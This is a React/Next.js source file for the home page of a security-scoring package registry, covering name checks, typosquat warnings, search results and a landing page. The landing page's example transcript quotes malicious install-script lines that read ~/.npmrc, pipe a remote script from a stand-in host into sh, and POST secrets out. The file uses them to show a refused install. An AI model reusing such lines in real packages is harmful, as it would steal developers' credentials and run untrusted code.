import Link from "next/link";
import { Suspense } from "react";
import { Skeleton } from "@/components/ui/skeleton";
import { CheckIcon, XIcon, TriangleAlertIcon, ArrowRightIcon, Undo2Icon, GaugeIcon, ShieldCheckIcon, SearchCheckIcon } from "lucide-react";
import { checkName, search, type NameCheck, type SearchResult } from "@/lib/registry";
import { ScoreBadge } from "@/components/score-badge";

type StatusKind = "free" | "taken" | "warn";

function Name({ name, q, className = "" }: { name: string; q: string; className?: string }) {
  const i = q.length > 0 ? name.indexOf(q) : -1;
  if (i < 0) {
    const scope = name.startsWith("@") ? name.slice(0, name.indexOf("/") + 1) : "";
    return (
      <span className={`truncate font-mono ${className}`}>
        {scope && <span className="text-muted-foreground">{scope}</span>}
        {name.slice(scope.length)}
      </span>
    );
  }
  return (
    <span className={`truncate font-mono text-muted-foreground ${className}`}>
      {name.slice(0, i)}
      <span className="text-foreground">{name.slice(i, i + q.length)}</span>
      {name.slice(i + q.length)}
    </span>
  );
}

function Status({ kind, children }: { kind: StatusKind; children: React.ReactNode }) {
  const tone = kind === "free" ? "text-ok" : kind === "warn" ? "text-warn" : "text-muted-foreground";
  const Icon = kind === "free" ? CheckIcon : kind === "warn" ? TriangleAlertIcon : XIcon;
  return (
    <span className={`inline-flex shrink-0 items-center gap-1.5 text-sm font-medium ${tone}`}>
      <Icon className="size-4" aria-hidden />
      {children}
    </span>
  );
}

function Cell({ label, href, children, className = "" }: { label: string; href?: string; children: React.ReactNode; className?: string }) {
  const body = (
    <>
      <div className="flex items-center justify-between gap-3 text-sm text-muted-foreground">
        {label}
        {href && <ArrowRightIcon className="size-4 transition-transform group-hover:translate-x-0.5" aria-hidden />}
      </div>
      <div className="mt-3 flex min-w-0 flex-col gap-2">{children}</div>
    </>
  );
  const base = `flex min-w-0 flex-col p-5 sm:p-6 ${className}`;
  return href ? (
    <Link href={href} className={`group ${base} transition-colors hover:bg-surface/70 focus-visible:bg-surface/70 focus-visible:outline-none`}>
      {body}
    </Link>
  ) : (
    <div className={base}>{body}</div>
  );
}

/** Four fixed slots answering "can I use this name, and is it safe to install?" in one glance. */
function TopResults({ check }: { check: NameCheck }) {
  const scoped = check.suggestions.find((s) => s.name.startsWith("@"));
  const nearest = check.lookalikes[0] ?? check.similar[0];
  const alternatives = check.suggestions.filter((s) => !s.name.startsWith("@") && s.available).slice(0, 4);
  const exactNote = check.taken
    ? check.description || (check.source === "upstream" ? "On the public npm registry." : "")
    : check.valid
      ? "Nobody has published this name."
      : "Not a valid package name.";
  return (
    <section aria-labelledby="top-results">
      <h2 id="top-results" className="mb-4 text-xl font-medium tracking-tight">
        Top results
      </h2>
      <div className="overflow-hidden rounded-2xl border">
        <Cell label="Exact name" href={check.taken ? `/package/${check.query}` : undefined} className="border-b">
          <div className="flex flex-wrap items-center gap-x-4 gap-y-2">
            <Name name={check.query} q="" className="text-2xl font-medium tracking-tight sm:text-[28px]" />
            {check.taken ? (
              <>
                <Status kind="taken">taken{check.owners.length ? ` by ${check.owners.slice(0, 2).join(", ")}` : ""}</Status>
                <ScoreBadge score={check.latest?.score} grade={check.latest?.grade} />
              </>
            ) : check.available ? (
              <Status kind="free">available</Status>
            ) : (
              <Status kind="warn">{check.valid ? "blocked: too close to a popular name" : "invalid"}</Status>
            )}
          </div>
          {exactNote && <p className="max-w-2xl text-pretty text-muted-foreground">{exactNote}</p>}
        </Cell>
        <div className="grid divide-y md:grid-cols-3 md:divide-x md:divide-y-0">
          <Cell label="Under your scope">
            <Name name={scoped?.name ?? `@you/${check.query}`} q="" className="text-base" />
            {scoped ? (
              scoped.available ? <Status kind="free">available</Status> : <Status kind="taken">taken</Status>
            ) : (
              <span className="text-sm text-muted-foreground">Log in to check</span>
            )}
            <p className="text-sm text-muted-foreground">A scoped name is always yours.</p>
          </Cell>
          <Cell label="Look-alike" href={nearest ? `/package/${nearest.name}` : undefined}>
            {nearest ? (
              <>
                <Name name={nearest.name} q="" className="text-base" />
                <Status kind="warn">typo risk</Status>
                <p className="text-sm text-pretty text-muted-foreground">{nearest.reason}</p>
              </>
            ) : (
              <>
                <span className="font-mono text-base text-muted-foreground">none</span>
                <Status kind="free">clear</Status>
                <p className="text-sm text-muted-foreground">Nothing popular is one typo away.</p>
              </>
            )}
          </Cell>
          <Cell label="Alternatives">
            {alternatives.length > 0 ? (
              <ul className="flex flex-col gap-1.5">
                {alternatives.map((s) => (
                  <li key={s.name} className="flex items-center justify-between gap-3">
                    <span className="truncate font-mono text-base">{s.name}</span>
                    <CheckIcon className="size-4 shrink-0 text-ok" aria-label="available" />
                  </li>
                ))}
              </ul>
            ) : (
              <p className="text-sm text-muted-foreground">No free variations found.</p>
            )}
          </Cell>
        </div>
      </div>
    </section>
  );
}

function Results({ results, q }: { results: SearchResult[]; q: string }) {
  return (
    <section aria-labelledby="all-results">
      <h2 id="all-results" className="mb-2 flex items-baseline gap-2 text-xl font-medium tracking-tight">
        All results <span className="text-base font-normal text-muted-foreground tabular-nums">{results.length}</span>
      </h2>
      {results.length === 0 ? (
        <p className="border-t py-6 text-pretty text-muted-foreground">
          No packages on this registry match <span className="font-mono text-foreground">{q}</span>. Public npm packages show up when you search their exact name.
        </p>
      ) : (
        <ul className="border-t">
          {results.map((r) => (
            <li key={r.package.name} className="border-b">
              <Link
                href={`/package/${r.package.name}`}
                className="-mx-3 flex min-h-16 items-center gap-4 rounded-xl px-3 py-3.5 transition-colors hover:bg-surface focus-visible:bg-surface focus-visible:outline-none"
              >
                <div className="flex min-w-0 flex-1 flex-col gap-1 md:flex-row md:items-baseline md:gap-4">
                  <Name name={r.package.name} q={q} className="text-base md:w-64 md:shrink-0" />
                  <span className="truncate text-[15px] text-muted-foreground">{r.package.description}</span>
                </div>
                <span className="hidden font-mono text-sm text-muted-foreground tabular-nums sm:block">{r.package.version}</span>
                <ScoreBadge score={r.apmScore?.score} grade={r.apmScore?.grade} />
              </Link>
            </li>
          ))}
        </ul>
      )}
    </section>
  );
}

function ResultsSkeleton() {
  return (
    <div className="flex flex-col gap-12" aria-busy="true" aria-label="Loading results">
      <div>
        <Skeleton className="mb-4 h-6 w-32" />
        <div className="rounded-2xl border">
          <div className="flex flex-col gap-3 border-b p-6">
            <Skeleton className="h-4 w-24" />
            <Skeleton className="h-8 w-56" />
            <Skeleton className="h-4 w-80 max-w-full" />
          </div>
          <div className="grid md:grid-cols-3">
            {[0, 1, 2].map((i) => (
              <div key={i} className="flex flex-col gap-3 p-6">
                <Skeleton className="h-4 w-24" />
                <Skeleton className="h-5 w-40" />
                <Skeleton className="h-4 w-28" />
              </div>
            ))}
          </div>
        </div>
      </div>
      <div>
        <Skeleton className="mb-4 h-6 w-28" />
        {[0, 1, 2].map((i) => (
          <div key={i} className="flex h-16 items-center gap-4 border-t">
            <Skeleton className="h-4 w-48" />
            <Skeleton className="h-4 flex-1" />
            <Skeleton className="h-7 w-16" />
          </div>
        ))}
      </div>
    </div>
  );
}

const TRY = ["react", "tiny-slg", "color-helper-pro", "zod"] as const;

/** Trimmed from real `apm add color-helper-pro` output against the demo registry. Indent is the CLI's nesting level. */
const TRANSCRIPT: ReadonlyArray<{ tone: "cmd" | "bad" | "pts" | "ev" | "muted" | "warn"; indent?: 1 | 2; text: string }> = [
  { tone: "cmd", text: "apm add color-helper-pro" },
  { tone: "bad", text: "✗ color-helper-pro@0.4.0  score 35/100 (F)" },
  { tone: "pts", indent: 1, text: "-25 credential-access  Reads credential files or secret environment variables" },
  { tone: "ev", indent: 2, text: "setup.js:2: const t=fs.readFileSync(os.homedir()+'/.npmrc','utf8');" },
  { tone: "pts", indent: 1, text: "-15 shell-exec  Starts shell commands or child processes" },
  { tone: "ev", indent: 2, text: "setup.js:4: require('child_process').execSync('curl -s https://collect.example.net/s.sh | sh" },
  { tone: "pts", indent: 1, text: "-15 install-script  Runs a script at install time (preinstall, install or postinstall)" },
  { tone: "ev", indent: 2, text: "package.json scripts.postinstall: node setup.js" },
  { tone: "pts", indent: 1, text: "-10 network  Makes network requests" },
  { tone: "ev", indent: 2, text: "setup.js:3: fetch('https://collect.example.net/x',{method:'POST',body:JSON.stringify({t,env:" },
  { tone: "warn", text: "refused: No version of color-helper-pro matching latest passes the policy." },
  { tone: "muted", text: "Review the signals above. To install anyway: apm add color-helper-pro --force" },
];

const LINE_TONE = {
  cmd: "text-inverse-foreground",
  bad: "text-inverse-bad",
  pts: "text-inverse-foreground",
  ev: "text-inverse-muted",
  muted: "text-inverse-muted",
  warn: "mt-6 text-inverse-warn",
} as const;

const INDENT = { 0: "", 1: "pl-4 sm:pl-6", 2: "pl-8 sm:pl-14" } as const;

const FEATURES = [
  { icon: Undo2Icon, title: "Yank or revoke any version", body: "Yank hides a version from new installs. Revoke is for malicious releases: the tarball returns 410 and audits flag it. No 72-hour limit." },
  { icon: GaugeIcon, title: "A score for every version", body: "Out of 100. Every lost point names the file and line that cost it, and the page lists what the score cannot see." },
  { icon: ShieldCheckIcon, title: "Checks before install", body: "apm add and apm x read the whole dependency tree and the 24-hour cooldown before bun or npm writes anything to disk." },
  { icon: SearchCheckIcon, title: "Name search before you publish", body: "See whether a name is free, whether it sits one typo from a popular package, and which variations are still open." },
] as const;

function Landing() {
  return (
    <div className="flex flex-col items-center">
      <section className="flex max-w-3xl flex-col items-center pt-8 text-center sm:pt-16">
        <h1 className="text-[34px] leading-[1.15] font-medium tracking-[-0.02em] text-balance sm:text-5xl sm:leading-[1.15]">
          Search a package, or check a name before you publish.
        </h1>
        <p className="mt-5 max-w-xl text-lg leading-8 text-pretty text-muted-foreground">
          Every version gets an explained security score. Maintainers can yank or revoke a bad release in one step. Point any client at{" "}
          <code className="rounded-md bg-surface px-1.5 py-0.5 font-mono text-[15px] text-foreground">/~safe/</code> to skip versions younger than 24 hours or scoring under 40.
        </p>
        <div className="mt-8 flex flex-wrap items-center justify-center gap-2">
          <span className="mr-1 text-sm text-muted-foreground">Try</span>
          {TRY.map((q) => (
            <Link
              key={q}
              href={`/?q=${q}`}
              className="inline-flex h-9 items-center rounded-full bg-surface px-4 font-mono text-sm transition-colors hover:bg-secondary"
            >
              {q}
            </Link>
          ))}
        </div>
      </section>

      <section aria-label="Example: apm add refusing a risky package" className="mt-16 w-full max-w-4xl sm:mt-24">
        <div className="overflow-hidden rounded-2xl bg-inverse text-inverse-foreground shadow-frame">
          <div className="flex items-center justify-between border-b border-inverse-border px-5 py-3 text-[13px] text-inverse-muted">
            <span>~/my-app</span>
            <span>apm add, refused before install</span>
          </div>
          <pre className="px-5 py-5 font-mono text-xs leading-5 whitespace-pre-wrap sm:px-6 sm:text-[13px] sm:leading-6">
            {TRANSCRIPT.map((l, i) => (
              <div key={i} className={`break-words ${LINE_TONE[l.tone]} ${INDENT[l.indent ?? 0]}`}>
                {l.tone === "cmd" ? (
                  <>
                    <span className="text-prompt">my-app</span>
                    <span className="text-inverse-muted"> % </span>
                    {l.text}
                  </>
                ) : (
                  l.text
                )}
              </div>
            ))}
          </pre>
        </div>
      </section>

      <section aria-labelledby="what" className="mt-28 w-full max-w-4xl sm:mt-36">
        <h2 id="what" className="text-center text-[28px] leading-tight font-medium tracking-[-0.02em] text-balance sm:text-4xl">
          A registry that can take a release back.
        </h2>
        <div className="mt-14 grid gap-x-16 gap-y-12 sm:mt-20 sm:grid-cols-2">
          {FEATURES.map((f) => (
            <div key={f.title} className="flex flex-col">
              <f.icon className="size-6 text-muted-foreground" strokeWidth={1.5} aria-hidden />
              <h3 className="mt-5 text-lg font-medium">{f.title}</h3>
              <p className="mt-1 text-[17px] leading-7 text-pretty text-muted-foreground">{f.body}</p>
            </div>
          ))}
        </div>
        <div className="mt-16 grid overflow-hidden rounded-2xl border font-mono text-sm sm:grid-cols-2 sm:divide-x">
          <div className="border-b p-5 sm:border-b-0">
            <div className="font-sans text-sm text-muted-foreground">Install with a check</div>
            <div className="mt-1.5">bunx apm add zod</div>
          </div>
          <div className="p-5">
            <div className="font-sans text-sm text-muted-foreground">Publish with a preflight</div>
            <div className="mt-1.5">bunx apm publish --bump patch</div>
          </div>
        </div>
      </section>
    </div>
  );
}

export default function Home({ searchParams }: PageProps<"/">) {
  return (
    <Suspense fallback={<ResultsSkeleton />}>
      <HomeContent searchParams={searchParams} />
    </Suspense>
  );
}

async function HomeContent({ searchParams }: { searchParams: PageProps<"/">["searchParams"] }) {
  const raw = (await searchParams).q;
  const q = (Array.isArray(raw) ? raw[0] : raw)?.trim().toLowerCase() ?? "";
  if (!q) return <Landing />;
  const [check, results] = await Promise.all([checkName(q), search(q)]);
  return (
    <div className="flex flex-col gap-14">
      {check ? <TopResults check={check} /> : <p className="text-muted-foreground">The registry did not answer. Try again in a moment.</p>}
      <Results results={results.filter((r) => r.package.name !== q || !check?.taken)} q={q} />
    </div>
  );
}
